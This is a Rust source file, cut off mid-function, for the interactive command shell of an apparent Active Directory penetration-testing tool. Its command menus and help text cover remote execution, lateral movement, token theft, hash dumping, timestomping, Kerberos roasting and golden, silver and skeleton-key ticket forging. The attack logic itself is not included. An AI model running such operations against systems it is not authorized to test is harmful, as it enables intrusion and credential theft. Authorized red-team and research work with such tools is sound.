//! Interactive Shell Implementation
//!
//! Provides a full interactive command-line interface for Overthrone
//! with command parsing, tab completion, history, and module integration.
//! Inspired by evil-winrm and other penetration testing shells.

use crate::banner;
use crate::ShellType as CliShellType;
use colored::Colorize;
use overthrone_core::error::Result;
use overthrone_core::exec::ExecCredentials;
use overthrone_core::exec::shell::{InteractiveShell, ShellConfig, ShellType};
use rustyline::completion::{Completer, FilenameCompleter, Pair};
use rustyline::error::ReadlineError;
use rustyline::highlight::Highlighter;
use rustyline::hint::Hinter;
use rustyline::history::DefaultHistory;
use rustyline::validate::{ValidationContext, ValidationResult, Validator};
use rustyline::{CompletionType, Config, Context, EditMode, Editor};
use rustyline_derive::Helper;
use std::borrow::Cow;
use std::collections::HashMap;
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncWriteExt;
use tokio::sync::Mutex;

// ═══════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════

const MAX_HISTORY: usize = 1000;
const PROMPT_COLOR: &str = "cyan";
#[allow(dead_code)]
const WARNING_COLOR: &str = "yellow";

// ═══════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════

/// Convert CLI shell type to core shell type
fn to_core_shell_type(shell_type: &CliShellType) -> ShellType {
    match shell_type {
        CliShellType::Winrm => ShellType::Winrm,
        CliShellType::Smb => ShellType::Smb,
        CliShellType::Wmi => ShellType::Wmi,
    }
}

// ═══════════════════════════════════════════════════════
// Tab Completion Helper
// ═══════════════════════════════════════════════════════

/// Available commands for tab completion
const COMMANDS: &[&str] = &[
    "help", "?", "connect", "disconnect", "exec", "enum", "kerberos", "smb",
    "graph", "reaper", "exit", "quit", "q", "clear", "cls", "history", "h",
    "whoami", "hostname", "pwd", "ls", "dir", "cd", "upload", "download",
    "info", "sessions", "bg", "fg", "set", "unset", "run", "use", "log",
    "spawn", "pivot", "migrate", "steal_token", "rev2self", "getuid",
    "getpid", "ps", "kill", "shell", "powershell", "cat", "type", "rm",
    "del", "mkdir", "rmdir", "mv", "cp", "copy", "timestomp", "hashdump",
    "luid", "klist", "kirbi", "ptt", "purge", "monitor", "net", "ipconfig",
];

/// Subcommands for specific commands
const KERBEROS_SUBCOMMANDS: &[&str] = &["roast", "asrep", "tgt", "tgs", "list", "purge", "ptt"];
const SMB_SUBCOMMANDS: &[&str] = &["shares", "admin", "spider", "get", "put", "ls", "cat"];
const GRAPH_SUBCOMMANDS: &[&str] = &["build", "path", "path_to_da", "stats", "export", "shortest"];
const ENUM_SUBCOMMANDS: &[&str] = &["users", "computers", "groups", "trusts", "spns", "asrep", "delegations", "gpos", "all"];
const REAPER_SUBCOMMANDS: &[&str] = &["all", "users", "computers", "groups", "trusts", "spns", "delegations", "gpos", "laps", "mssql", "adcs"];
const USE_MODULES: &[&str] = &["hunter/kerberoast", "hunter/asreproast", "hunter/coerce", "hunter/rbcd",
    "forge/golden", "forge/silver", "forge/diamond", "forge/skeleton",
    "reaper/users", "reaper/computers", "reaper/groups", "reaper/trusts",
    "reaper/adcs", "reaper/laps", "reaper/mssql", "crawler/bloodhound"];

/// Session variables that can be set
const SETTABLE_VARS: &[&str] = &["timeout", "debug", "color", "prompt", "auto_upload", "download_path"];

/// Custom completer for Overthrone commands
#[derive(Helper)]
struct OverthroneCompleter {
    file_completer: FilenameCompleter,
    #[allow(dead_code)] // Used for session-aware tab completion
    sessions: Arc<Mutex<Vec<SessionInfo>>>,
}

impl OverthroneCompleter {
    fn new(sessions: Arc<Mutex<Vec<SessionInfo>>>) -> Self {
        Self {
            file_completer: FilenameCompleter::new(),
            sessions,
        }
    }

    fn complete_command(&self, line: &str, pos: usize) -> rustyline::Result<(usize, Vec<Pair>)> {
        let args: Vec<&str> = line.split_whitespace().collect();
        let mut completions = Vec::new();
        
        if args.is_empty() || (line.ends_with(' ') && args.len() == 1) {
            // Complete command names
            for cmd in COMMANDS {
                completions.push(Pair {
                    display: cmd.to_string(),
                    replacement: cmd.to_string(),
                });
            }
            return Ok((0, completions));
        }

        let command = args[0].to_lowercase();
        let _arg_pos = line.len() - pos;

        // Handle subcommand completion
        if args.len() == 1 || (args.len() == 2 && !line.ends_with(' ')) {
            let prefix = if args.len() == 2 { args[1] } else { "" };
            let subcommands = match command.as_str() {
                "kerberos" => KERBEROS_SUBCOMMANDS,
                "smb" => SMB_SUBCOMMANDS,
                "graph" => GRAPH_SUBCOMMANDS,
                "enum" => ENUM_SUBCOMMANDS,
                "reaper" => REAPER_SUBCOMMANDS,
                "set" => SETTABLE_VARS,
                "use" => USE_MODULES,
                _ => &[],
            };
            
            for subcmd in subcommands {
                if subcmd.starts_with(prefix) {
                    completions.push(Pair {
                        display: subcmd.to_string(),
                        replacement: subcmd.to_string(),
                    });
                }
            }
            
            if !completions.is_empty() {
                let start = if args.len() == 2 { line.len() - prefix.len() } else { pos };
                return Ok((start, completions));
            }
        }

        // Handle sessions completion for fg command
        if command == "fg" && args.len() <= 2 {
            // This would need async to get session IDs, skip for now
            // In a full impl, we'd complete session IDs
        }

        Ok((pos, completions))
    }
}

impl Completer for OverthroneCompleter {
    type Candidate = Pair;

    fn complete(&self, line: &str, pos: usize, _ctx: &Context<'_>) -> rustyline::Result<(usize, Vec<Pair>)> {
        // First try command completion
        let (cmd_start, cmd_completions) = self.complete_command(line, pos)?;
        if !cmd_completions.is_empty() {
            return Ok((cmd_start, cmd_completions));
        }

        // Then try file completion for upload/download/cd commands
        let args: Vec<&str> = line.split_whitespace().collect();
        if !args.is_empty() {
            let command = args[0].to_lowercase();
            if matches!(command.as_str(), "upload" | "download" | "cd" | "cat" | "type" | "run" | "rm" | "del" | "mkdir" | "ls" | "dir") {
                // Get the partial path being typed
                if args.len() > 1 || line.ends_with(' ') {
                    let partial = if args.len() > 1 { args.last().unwrap_or(&"") } else { "" };
                    return self.file_completer.complete(partial, partial.len(), _ctx);
                }
            }
        }

        Ok((pos, vec![]))
    }
}

impl Highlighter for OverthroneCompleter {
    fn highlight<'l>(&self, line: &'l str, _pos: usize) -> Cow<'l, str> {
        // Highlight the command in the prompt color
        let parts: Vec<&str> = line.splitn(2, ' ').collect();
        if !parts.is_empty() {
            Cow::Owned(format!("{}{}", parts[0].color(PROMPT_COLOR), 
                if parts.len() > 1 { format!(" {}", parts[1]) } else { String::new() }))
        } else {
            Cow::Borrowed(line)
        }
    }

    fn highlight_prompt<'b, 's: 'b, 'p: 'b>(
        &'s self,
        prompt: &'p str,
        _default: bool,
    ) -> Cow<'b, str> {
        Cow::Owned(prompt.cyan().bold().to_string())
    }

    fn highlight_hint<'h>(&self, hint: &'h str) -> Cow<'h, str> {
        Cow::Owned(hint.dimmed().to_string())
    }

    fn highlight_char(&self, _line: &str, _pos: usize, _forced: bool) -> bool {
        true
    }
}

impl Hinter for OverthroneCompleter {
    type Hint = String;
    
    fn hint(&self, _line: &str, _pos: usize, _ctx: &rustyline::Context<'_>) -> Option<String> {
        None
    }
}

impl Validator for OverthroneCompleter {
    fn validate(&self, _ctx: &mut ValidationContext) -> rustyline::Result<ValidationResult> {
        Ok(ValidationResult::Valid(None))
    }
}

// ═══════════════════════════════════════════════════════
// Session Info
// ═══════════════════════════════════════════════════════

/// Session information for background sessions
#[derive(Debug, Clone)]
pub struct SessionInfo {
    pub id: u32,
    pub target: String,
    pub shell_type: ShellType,
    pub username: Option<String>,
    pub domain: Option<String>,
    pub created: chrono::DateTime<chrono::Local>,
    #[allow(dead_code)] // Tracked for session info display
    pub last_command: Option<String>,
    pub command_count: u32,
}

impl std::fmt::Display for SessionInfo {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let user = self.username.as_deref().unwrap_or("unknown");
        let since = self.created.format("%H:%M:%S");
        write!(f, "Session {} - {}\\{}@{} ({}) [{}]", 
            self.id, 
            self.domain.as_deref().unwrap_or("DOMAIN"), 
            user, 
            self.target, 
            self.shell_type,
            since
        )
    }
}

// ═══════════════════════════════════════════════════════
// Session Variables
// ═══════════════════════════════════════════════════════

/// Session variables that can be configured
#[derive(Debug, Clone)]
pub struct SessionVars {
    pub timeout_secs: u64,
    pub debug: bool,
    pub color: bool,
    pub prompt: String,
    pub auto_upload: bool,
    pub download_path: String,
}

impl Default for SessionVars {
    fn default() -> Self {
        Self {
            timeout_secs: 30,
            debug: false,
            color: true,
            prompt: "overthrone".to_string(),
            auto_upload: false,
            download_path: ".".to_string(),
        }
    }
}

// ═══════════════════════════════════════════════════════
// Module Context
// ═══════════════════════════════════════════════════════

/// Loaded module context
#[derive(Debug, Clone)]
pub struct ModuleContext {
    pub module_path: String,
    pub module_type: ModuleType,
    pub options: HashMap<String, String>,
    pub required_options: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ModuleType {
    Hunter,
    Forge,
    Reaper,
    Crawler,
}

// ═══════════════════════════════════════════════════════
// Interactive Shell Session
// ═══════════════════════════════════════════════════════

/// Interactive shell session with command parsing and module integration
pub struct InteractiveSession {
    shell: Option<InteractiveShell>,
    session_id: Option<u32>,
    sessions: Arc<Mutex<Vec<SessionInfo>>>,
    next_session_id: Arc<Mutex<u32>>,
    vars: SessionVars,
    initial_target: Option<String>,
    initial_shell_type: Option<ShellType>,
    credentials: Option<(String, String, Option<String>)>, // domain, username, password/hash
    module: Option<ModuleContext>,
    log_file: Option<String>,
    command_history: Vec<String>,
}

impl InteractiveSession {
    /// Create a new interactive session
    #[allow(dead_code)] // Entry point for interactive mode
    pub fn new() -> Self {
        Self {
            shell: None,
            session_id: None,
            sessions: Arc::new(Mutex::new(Vec::new())),
            next_session_id: Arc::new(Mutex::new(1)),
            vars: SessionVars::default(),
            initial_target: None,
            initial_shell_type: None,
            credentials: None,
            module: None,
            log_file: None,
            command_history: Vec::new(),
        }
    }

    /// Create a new interactive session with pre-configured target
    pub fn with_target(target: &str, shell_type: &CliShellType) -> Self {
        Self {
            shell: None,
            session_id: None,
            sessions: Arc::new(Mutex::new(Vec::new())),
            next_session_id: Arc::new(Mutex::new(1)),
            vars: SessionVars::default(),
            initial_target: Some(target.to_string()),
            initial_shell_type: Some(to_core_shell_type(shell_type)),
            credentials: None,
            module: None,
            log_file: None,
            command_history: Vec::new(),
        }
    }

    /// Set credentials for the session
    #[allow(dead_code)] // Used when starting shell with pre-configured creds
    pub fn with_credentials(mut self, domain: String, username: String, password: Option<String>) -> Self {
        self.credentials = Some((domain, username, password));
        self
    }

    /// Build `ExecCredentials` from the stored `(domain, username, password)` tuple.
    fn build_exec_credentials(&self) -> Option<ExecCredentials> {
        self.credentials.as_ref().map(|(domain, username, password)| ExecCredentials {
            domain: domain.clone(),
            username: username.clone(),
            password: password.clone().unwrap_or_default(),
            nt_hash: None,
        })
    }

    /// Start the interactive shell
    pub async fn start(&mut self) -> Result<()> {
        banner::print_banner();
        println!("{}", "Interactive Mode - Type 'help' for available commands".bright_yellow());
        println!();

        // Setup rustyline editor
        let config = Config::builder()
            .history_ignore_space(true)
            .completion_type(CompletionType::List)
            .edit_mode(EditMode::Emacs)
            .max_history_size(MAX_HISTORY)
            .expect("Invalid max history size")
            .build();

        let mut rl: Editor<OverthroneCompleter, DefaultHistory> = Editor::with_config(config)
            .expect("Failed to create editor");

        // Setup helper with completion
        let helper = OverthroneCompleter::new(self.sessions.clone());
        rl.set_helper(Some(helper));
        
        // Load history from file if exists
        let history_path = dirs::config_dir()
            .map(|p| p.join("overthrone").join("history.txt"))
            .unwrap_or_else(|| std::path::PathBuf::from(".overthrone_history"));
        
        let _ = rl.load_history(&history_path);

        // Auto-connect if target was provided
        if let (Some(target), Some(shell_type)) = (&self.initial_target, &self.initial_shell_type) {
            println!("{} Auto-connecting to {} via {}...", "▸".bright_black(), target.cyan(), shell_type);
            
            let config = ShellConfig {
                target: target.clone(),
                shell_type: *shell_type,
                timeout: Duration::from_secs(self.vars.timeout_secs),
                credentials: self.build_exec_credentials(),
            };

            match InteractiveShell::connect(config).await {
                Ok(shell) => {
                    // Register session
                    let session_id = {
                        let mut next_id = self.next_session_id.lock().await;
                        let id = *next_id;
                        *next_id += 1;
                        id
                    };
                    
                    let session_info = SessionInfo {
                        id: session_id,
                        target: target.clone(),
                        shell_type: *shell_type,
                        username: self.credentials.as_ref().map(|(_, u, _)| u.clone()),
                        domain: self.credentials.as_ref().map(|(d, _, _)| d.clone()),
                        created: chrono::Local::now(),
                        last_command: None,
                        command_count: 0,
                    };
                    
                    let mut sessions = self.sessions.lock().await;
                    sessions.push(session_info);
                    
                    self.shell = Some(shell);
                    self.session_id = Some(session_id);
                    
                    println!("{} Connected successfully! Session {}", "✓".green(), session_id);
                    println!();
                }
                Err(e) => {
                    println!("{} Auto-connect failed: {}", "✗".red(), e);
                    println!("{} Use 'connect <target> [type]' to connect manually", "▸".bright_black());
                    println!();
                }
            }
        }

        // Main command loop
        loop {
            let prompt = self.get_prompt();
            
            match rl.readline(&prompt) {
                Ok(line) => {
                    let input = line.trim();
                    
                    if input.is_empty() {
                        continue;
                    }

                    // Add to history
                    let _ = rl.add_history_entry(input);
                    self.command_history.push(input.to_string());

                    // Log command if logging enabled
                    if let Some(log_path) = &self.log_file {
                        let _ = self.log_command(input, log_path).await;
                    }

                    match self.execute_command(input).await {
                        Ok(should_exit) => {
                            if should_exit {
                                break;
                            }
                        }
                        Err(e) => {
                            println!("{} {}", "Error:".red(), e);
                        }
                    }
                }
                Err(ReadlineError::Interrupted) => {
                    // Ctrl+C
                    println!("^C");
                    println!("{} Press Ctrl+D or type 'exit' to quit", "▸".bright_black());
                    continue;
                }
                Err(ReadlineError::Eof) => {
                    // Ctrl+D
                    println!("{} Exiting...", "▸".bright_black());
                    break;
                }
                Err(e) => {
                    println!("{} Read error: {}", "Error:".red(), e);
                    break;
                }
            }
        }

        // Save history
        let _ = rl.save_history(&history_path);

        // Close any active session
        if let Some(shell) = self.shell.take() {
            let _ = shell.close().await;
        }

        Ok(())
    }

    /// Get the current prompt
    fn get_prompt(&self) -> String {
        if let Some(module) = &self.module {
            format!("{}({})> ", "overthrone".cyan(), module.module_path.yellow())
        } else if let Some(shell) = &self.shell {
            let session_info = shell.session_info();
            format!(
                "{}@{}({})[{}]> ",
                self.vars.prompt.cyan(),
                session_info.target.split('.').next().unwrap_or("target").cyan(),
                format!("{}", session_info.shell_type).yellow(),
                session_info.command_count.to_string().dimmed()
            )
        } else {
            format!("{}> ", self.vars.prompt.cyan())
        }
    }

    /// Log command to file
    async fn log_command(&self, command: &str, log_path: &str) -> std::io::Result<()> {
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
        let log_entry = format!("[{}] {}\n", timestamp, command);
        tokio::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(log_path)
            .await?
            .write_all(log_entry.as_bytes())
            .await
    }

    /// Execute a command
    async fn execute_command(&mut self, input: &str) -> Result<bool> {
        let words = shell_words(input);
        let args: Vec<&str> = words.iter().map(|s| s.as_str()).collect();
        
        if args.is_empty() {
            return Ok(false);
        }

        let command = args[0].to_lowercase();
        let args = if args.len() > 1 { &args[1..] } else { &[] };

        // Check if we're in module context
        if let Some(_module) = &self.module {
            return self.execute_module_command(&command, args).await;
        }

        match command.as_str() {
            // Help and info
            "help" | "?" => self.show_help(args),
            "info" => self.cmd_info().await?,
            
            // Connection management
            "connect" => self.cmd_connect(args).await?,
            "disconnect" => self.cmd_disconnect().await?,
            
            // Session management
            "sessions" => self.cmd_sessions().await?,
            "bg" => self.cmd_bg().await?,
            "fg" => self.cmd_fg(args).await?,
            
            // Command execution
            "exec" | "shell" => self.cmd_exec(args).await?,
            "powershell" => self.cmd_powershell(args).await?,
            "run" => self.cmd_run(args).await?,
            
            // File operations
            "upload" => self.cmd_upload(args).await?,
            "download" => self.cmd_download(args).await?,
            "cat" | "type" => self.cmd_cat(args).await?,
            "rm" | "del" => self.cmd_rm(args).await?,
            "mkdir" => self.cmd_mkdir(args).await?,
            "rmdir" => self.cmd_rmdir(args).await?,
            "mv" => self.cmd_mv(args).await?,
            "cp" | "copy" => self.cmd_cp(args).await?,
            
            // Enumeration
            "enum" => self.cmd_enum(args).await?,
            "reaper" => self.cmd_reaper(args).await?,
            
            // Kerberos operations
            "kerberos" => self.cmd_kerberos(args).await?,
            "klist" => self.cmd_klist().await?,
            "ptt" => self.cmd_ptt(args).await?,
            "purge" => self.cmd_purge().await?,
            
            // SMB operations
            "smb" => self.cmd_smb(args).await?,
            
            // Graph operations
            "graph" => self.cmd_graph(args).await?,
            
            // Lateral movement
            "pivot" => self.cmd_pivot(args).await?,
            "spawn" => self.cmd_spawn(args).await?,
            "migrate" => self.cmd_migrate(args).await?,
            
            // Token manipulation
            "steal_token" => self.cmd_steal_token(args).await?,
            "rev2self" => self.cmd_rev2self().await?,
            "getuid" => self.cmd_getuid().await?,
            "getpid" => self.cmd_getpid().await?,
            
            // Process management
            "ps" => self.cmd_ps(args).await?,
            "kill" => self.cmd_kill(args).await?,
            
            // Variable management
            "set" => self.cmd_set(args),
            "unset" => self.cmd_unset(args),
            
            // Module system
            "use" => self.cmd_use(args).await?,
            "back" => { self.module = None; },
            "options" => self.show_options(),
            
            // Logging
            "log" => self.cmd_log(args).await?,
            
            // Network commands
            "net" => self.cmd_net(args).await?,
            "ipconfig" => self.cmd_ipconfig().await?,
            
            // Hash operations
            "hashdump" => self.cmd_hashdump(args).await?,
            
            // Basic shell commands (pass to remote if connected)
            "whoami" => self.cmd_whoami().await?,
            "hostname" => self.cmd_hostname().await?,
            "pwd" => self.cmd_pwd().await?,
            "ls" | "dir" => self.cmd_ls(args).await?,
            "cd" => self.cmd_cd(args).await?,
            
            // Shell management
            "exit" | "quit" | "q" => return Ok(true),
            "clear" | "cls" => self.cmd_clear(),
            "history" | "h" => self.cmd_history(),
            
            // Unknown command - pass to remote shell if connected
            _ => {
                if let Some(shell) = &mut self.shell {
                    let output = shell.execute(input).await?;
                    println!("{}", output);
                } else {
                    println!("{} Unknown command '{}'. Type 'help' for available commands.", 
                        "Error:".red(), command);
                }
            }
        }

        Ok(false)
    }

    /// Execute a command in module context
    async fn execute_module_command(&mut self, command: &str, args: &[&str]) -> Result<bool> {
        match command {
            "back" | "exit" => {
                self.module = None;
            }
            "run" | "exploit" => {
                self.run_module().await?;
            }
            "set" => {
                self.set_module_option(args);
            }
            "unset" => {
                self.unset_module_option(args);
            }
            "options" | "show" => {
                self.show_module_options();
            }
            "info" => {
                self.show_module_info();
            }
            "help" | "?" => {
                self.show_module_help();
            }
            _ => {
                println!("{} Unknown module command: {}", "Error:".red(), command);
                println!("{} Available: set, unset, options, run, back", "▸".bright_black());
            }
        }
        Ok(false)
    }

    // ═══════════════════════════════════════════════════════
    // Help Commands
    // ═══════════════════════════════════════════════════════

    fn show_help(&self, args: &[&str]) {
        if !args.is_empty() {
            self.show_command_help(args[0]);
            return;
        }

        println!("\n{} {}", "╭─".bright_black(), "Overthrone Interactive Shell".bright_yellow());
        println!("{}", "│".bright_black());
        
        println!("{} {} Management:", "│".bright_black(), "Session".bright_yellow());
        println!("{}   {:<25} Connect to a target (winrm/smb/wmi)", "│".bright_black(), "connect <target> [type]".cyan());
        println!("{}   {:<25} Disconnect from current session", "│".bright_black(), "disconnect".cyan());
        println!("{}   {:<25} List all active sessions", "│".bright_black(), "sessions".cyan());
        println!("{}   {:<25} Background current session", "│".bright_black(), "bg".cyan());
        println!("{}   {:<25} Foreground a session", "│".bright_black(), "fg [id]".cyan());
        println!("{}   {:<25} Show session information", "│".bright_black(), "info".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} Execution:", "│".bright_black(), "Command".bright_yellow());
        println!("{}   {:<25} Execute command on target", "│".bright_black(), "exec <command>".cyan());
        println!("{}   {:<25} Execute PowerShell command", "│".bright_black(), "powershell <cmd>".cyan());
        println!("{}   {:<25} Run local script on target", "│".bright_black(), "run <script>".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} Operations:", "│".bright_black(), "File".bright_yellow());
        println!("{}   {:<25} Upload file to target", "│".bright_black(), "upload <local> <remote>".cyan());
        println!("{}   {:<25} Download file from target", "│".bright_black(), "download <remote> <local>".cyan());
        println!("{}   {:<25} Display file contents", "│".bright_black(), "cat/type <file>".cyan());
        println!("{}   {:<25} List directory", "│".bright_black(), "ls/dir [path]".cyan());
        println!("{}   {:<25} Change directory", "│".bright_black(), "cd <path>".cyan());
        println!("{}   {:<25} Delete file", "│".bright_black(), "rm/del <file>".cyan());
        println!("{}   {:<25} Create directory", "│".bright_black(), "mkdir <dir>".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} Enumeration:", "│".bright_black(), "AD".bright_yellow());
        println!("{}   {:<25} Enumerate AD objects", "│".bright_black(), "enum <target>".cyan());
        println!("{}   {:<25} Full AD enumeration", "│".bright_black(), "reaper [modules]".cyan());
        println!("{}   {:<25} Kerberos operations", "│".bright_black(), "kerberos <action>".cyan());
        println!("{}   {:<25} SMB operations", "│".bright_black(), "smb <action>".cyan());
        println!("{}   {:<25} Attack graph operations", "│".bright_black(), "graph <action>".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} Movement:", "│".bright_black(), "Lateral".bright_yellow());
        println!("{}   {:<25} Pivot to new target", "│".bright_black(), "pivot <target>".cyan());
        println!("{}   {:<25} Spawn new session", "│".bright_black(), "spawn <type>".cyan());
        println!("{}   {:<25} Steal token from process", "│".bright_black(), "steal_token <pid>".cyan());
        println!("{}   {:<25} Revert to original token", "│".bright_black(), "rev2self".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} System:", "│".bright_black(), "Module".bright_yellow());
        println!("{}   {:<25} Load a module", "│".bright_black(), "use <module>".cyan());
        println!("{}   {:<25} Exit module context", "│".bright_black(), "back".cyan());
        println!("{}   {:<25} Show module options", "│".bright_black(), "options".cyan());
        println!("{}   {:<25} Set module option", "│".bright_black(), "set <option> <value>".cyan());
        
        println!("{}", "│".bright_black());
        println!("{} {} Shell:", "│".bright_black(), "Local".bright_yellow());
        println!("{}   {:<25} Set session variable", "│".bright_black(), "set <var> <value>".cyan());
        println!("{}   {:<25} Log commands to file", "│".bright_black(), "log <file>".cyan());
        println!("{}   {:<25} Clear screen", "│".bright_black(), "clear/cls".cyan());
        println!("{}   {:<25} Show command history", "│".bright_black(), "history/h".cyan());
        println!("{}   {:<25} Exit interactive shell", "│".bright_black(), "exit/quit/q".cyan());
        
        println!("{}\n", "╰─".bright_black());
    }

    fn show_command_help(&self, cmd: &str) {
        match cmd.to_lowercase().as_str() {
            "kerberos" => {
                println!("\n{} Kerberos Operations:", "▸".bright_yellow());
                println!("  {:<20} Perform Kerberoasting attack", "roast".cyan());
                println!("  {:<20} Perform AS-REP Roasting", "asrep".cyan());
                println!("  {:<20} Request TGT for current user", "tgt".cyan());
                println!("  {:<20} Request TGS for SPN", "tgs <spn>".cyan());
                println!("  {:<20} List cached tickets", "list".cyan());
                println!("  {:<20} Purge cached tickets", "purge".cyan());
                println!("  {:<20} Import ticket from file", "ptt <file>".cyan());
            }
            "smb" => {
                println!("\n{} SMB Operations:", "▸".bright_yellow());
                println!("  {:<20} Enumerate SMB shares", "shares".cyan());
                println!("  {:<20} Check admin access", "admin".cyan());
                println!("  {:<20} Spider shares for files", "spider".cyan());
                println!("  {:<20} Download file via SMB", "get <remote> <local>".cyan());
                println!("  {:<20} Upload file via SMB", "put <local> <remote>".cyan());
            }
            "graph" => {
                println!("\n{} Graph Operations:", "▸".bright_yellow());
                println!("  {:<20} Build attack graph from AD data", "build".cyan());
                println!("  {:<20} Find attack path", "path <from> <to>".cyan());
                println!("  {:<20} Find path to Domain Admins", "path_to_da <from>".cyan());
                println!("  {:<20} Show graph statistics", "stats".cyan());
                println!("  {:<20} Export graph to file", "export [file]".cyan());
            }
            "use" => {
                println!("\n{} Available Modules:", "▸".bright_yellow());
                println!("\n  {} Hunter:", "▸".bright_black());
                println!("    hunter/kerberoast   - Kerberoasting attack");
                println!("    hunter/asreproast   - AS-REP Roasting attack");
                println!("    hunter/coerce       - Authentication coercion");
                println!("    hunter/rbcd         - RBCD abuse");
                
                println!("\n  {} Forge:", "▸".bright_black());
                println!("    forge/golden        - Forge Golden Ticket");
                println!("    forge/silver        - Forge Silver Ticket");
                println!("    forge/diamond       - Forge Diamond Ticket");
                println!("    forge/skeleton      - Skeleton key attack");
                
                println!("\n  {} Reaper:", "▸".bright_black());
                println!("    reaper/users        - Enumerate users");
                println!("    reaper/computers    - Enumerate computers");
                println!("    reaper/groups       - Enumerate groups");
                println!("    reaper/trusts       - Enumerate trusts");
                
                println!("\n  {} Crawler:", "▸".bright_black());
                println!("    crawler/bloodhound  - BloodHound data collection");
            }
            _ => {
                println!("{} No detailed help available for '{}'", "Error:".red(), cmd);
            }
        }
        println!();
    }

    // ═══════════════════════════════════════════════════════
    // Session Management Commands
    // ═══════════════════════════════════════════════════════

    async fn cmd_info(&self) -> Result<()> {
        println!("\n{} Session Information:", "▸".bright_yellow());
        
        if let Some(shell) = &self.shell {
            let info = shell.session_info();
            println!("  {:<15} {}", "Session ID:".cyan(), self.session_id.unwrap_or(0));
            println!("  {:<15} {}", "Target:".cyan(), info.target);
            println!("  {:<15} {}", "Shell Type:".cyan(), info.shell_type);
            println!("  {:<15} {}", "Commands Run:".cyan(), info.command_count);
        } else {
            println!("  {} No active session", "Status:".cyan());
        }
        
        println!("\n{} Variables:", "▸".bright_yellow());
        println!("  {:<15} {}s", "Timeout:".cyan(), self.vars.timeout_secs);
        println!("  {:<15} {}", "Debug:".cyan(), self.vars.debug);
        println!("  {:<15} {}", "Color:".cyan(), self.vars.color);
        println!("  {:<15} {}", "Prompt:".cyan(), self.vars.prompt);
        println!("  {:<15} {}", "Download Path:".cyan(), self.vars.download_path);
        
        if let Some(log) = &self.log_file {
            println!("  {:<15} {}", "Logging to:".cyan(), log);
        }
        
        println!();
        Ok(())
    }

    async fn cmd_connect(&mut self, args: &[&str]) -> Result<()> {
        if args.is_empty() {
            println!("{} Usage: connect <target> [type]", "Error:".red());
            println!("  Types: winrm, smb, wmi (default: winrm)");
            return Ok(());
        }

        let target = args[0];
        let shell_type = if args.len() > 1 {
            match args[1].to_lowercase().as_str() {
                "winrm" => ShellType::Winrm,
                "smb" => ShellType::Smb,
                "wmi" => ShellType::Wmi,
                _ => {
                    println!("{} Unknown shell type '{}'. Using WinRM.", "Warning:".yellow(), args[1]);
                    ShellType::Winrm
                }
            }
        } else {
            ShellType::Winrm
        };

        println!("{} Connecting to {} via {}...", "▸".bright_black(), target.cyan(), shell_type.to_string().yellow());

        let config = ShellConfig {
            target: target.to_string(),
            shell_type,
            timeout: Duration::from_secs(self.vars.timeout_secs),
            credentials: self.build_exec_credentials(),
        };

        match InteractiveShell::connect(config).await {
            Ok(shell) => {
                // Register new session
                let session_id = {
                    let mut next_id = self.next_session_id.lock().await;
                    let id = *next_id;
                    *next_id += 1;
                    id
                };
                
                let session_info = SessionInfo {
                    id: session_id,
                    target: target.to_string(),
                    shell_type,
                    username: self.credentials.as_ref().map(|(_, u, _)| u.clone()),
                    domain: self.credentials.as_ref().map(|(d, _, _)| d.clone()),
                    created: chrono::Local::now(),
                    last_command: None,
                    command_count: 0,
                };
                
                let mut sessions = self.sessions.lock().await;
                sessions.push(session_info);
                
                self.shell = Some(shell);
                self.session_id = Some(session_id);
                
                println!("{} Connected successfully! Session {}", "✓".green(), session_id);
            }
            Err(e) => {
                println!("{} Connection failed: {}", "✗".red(), e);
            }
        }

        Ok(())
    }

    async fn cmd_disconnect(&mut self) -> Result<()> {
        if let Some(shell) = self.shell.take() {
            shell.close().await?;
            
            // Remove from sessions list
            if let Some(id) = self.session_id {
                let mut sessions = self.sessions.lock().await;
                sessions.retain(|s| s.id != id);
            }
            
            self.session_id = None;
            println!("{} Disconnected from session", "✓".green());
        } else {
            println!("{} No active session to disconnect", "Error:".red());
        }
        Ok(())
    }

    async fn cmd_sessions(&self) -> Result<()> {
        let sessions = self.sessions.lock().await;
        
        if sessions.is_empty() {
            println!("{} No active sessions", "▸".bright_black());
            return Ok(());
        }

        println!("\n{} Active Sessions:", "▸".bright_yellow());
        println!("  {:<4} {:<25} {:<10} {:<15} {:<8}", "ID", "Target", "Type", "User", "Cmds");
        println!("  {}", "─".repeat(70).dimmed());
        
        for session in sessions.iter() {
            let current = if Some(session.id) == self.session_id {
                "*".green().to_string()
            } else {
                " ".to_string()
            };
            
            let user = session.username.as_deref().unwrap_or("unknown");
            println!("{} {:<3} {:<25} {:<10} {:<15} {:<8}", 
                current,
                session.id.to_string().cyan(),
                session.target.cyan(),
                session.shell_type.to_string().yellow(),
                user,
                session.command_count
            );
        }
        
        println!();
        Ok(())
    }

    async fn cmd_bg(&mut self) -> Result<()> {
        if self.shell.is_none() {
            println!("{} No active session to background", "Error:".red());
            return Ok(());
        }
        
        println!("{} Session {} backgrounded", "✓".green(), self.session_id.unwrap_or(0));
        println!("{} Use 'fg' to resume or 'sessions' to list", "▸".bright_black());
        
        // Keep the shell but clear the active reference
        // The shell stays in the sessions list
        self.shell = None;
        self.session_id = None;
        
        Ok(())
    }

    async fn cmd_fg(&mut self, args: &[&str]) -> Result<()> {
        let sessions = self.sessions.lock().await;
        
        if sessions.is_empty() {
            println!("{} No backgrounded sessions", "Error:".red());
            return Ok(());
        }

        // Parse target session ID or use most recent
        let target_id = if !args.is_empty() {
            args[0].parse::<u32>().ok()
        } else {
            // Default to most recent session
            sessions.last().map(|s| s.id)
        };

        drop(sessions); // Release lock before potential connect
        
        if let Some(id) = target_id {
            // Get session info (need to re-lock)
            let (target, shell_type) = {
                let sessions = self.sessions.lock().await;
                match sessions.iter().find(|s| s.id == id) {
                    Some(session) => (session.target.clone(), session.shell_type),
                    None => {
